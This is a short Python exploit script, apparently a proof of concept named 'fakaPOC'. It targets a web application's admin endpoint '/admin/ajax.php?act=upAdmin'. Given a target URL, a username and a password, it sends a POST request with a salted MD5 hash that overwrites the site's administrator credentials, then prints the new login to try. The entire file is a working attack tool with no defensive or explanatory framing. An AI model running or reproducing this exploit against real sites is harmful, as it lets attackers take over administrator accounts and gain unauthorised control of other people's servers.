#coding:utf-8

import requests
import hashlib
import sys
import argparse
import pyfiglet
import os


def generatepass(passwd):
    passwd=passwd+'!@#%!s!8#'
    h1=hashlib.md5()
    h1.update(passwd.encode(encoding='utf-8'))
    return h1.hexdigest()
	
	
def options():
    parser = argparse.ArgumentParser(description='Vxscan V1.0')
    parser.add_argument('-u','--url',help='vulnable target url')
    parser.add_argument('-p','--password',help='login password')
    parser.add_argument('-n','--name',help='login user name')
    args = parser.parse_args()
    


    if args.url and args.password and args.name:
        print('\033[94m[*]starting exploit!\033[0m')
        posturl=args.url
        if 'http' not in posturl:
            posturl='http://'+args.url
        posturl=posturl+'/admin/ajax.php?act=upAdmin'
        headers={"X-Requested-With":"XMLHttpRequest",'User-Agent':'HTTP/1.1','Content-Type':'application/x-www-form-urlencoded'}
        payload='u='+args.name+'&p='+generatepass(args.password)
        r1=requests.post(url=posturl,headers=headers,data=payload)
        if '成功' in r1.text:
            print("\033[92mSucessful!!\033[0m")
            print("please try \""+args.url+'/admin/login.php\" to test!!')
            print("\033[92mNew auth:\nuser:"+args.name+"\npassword:"+args.password+"\033[0m")
        else:
            print("\033[91mFailed\033[0m")
    else:
        print("\033[94m@usage:python3 "+sys.argv[0]+" -u [url] -p [password] -n [name]\033[0m")

def banner():
    ascii_banner = pyfiglet.figlet_format("fakaPOC")
    print('\033[92m'+ascii_banner+'\033[0m')


def main():
    try:
        os.system('clear')
        banner()
        options()
    except KeyboardInterrupt:
        print('\nCtrl+C Stop running\n')
        sys.exit(0)



if __name__=="__main__":
    main()
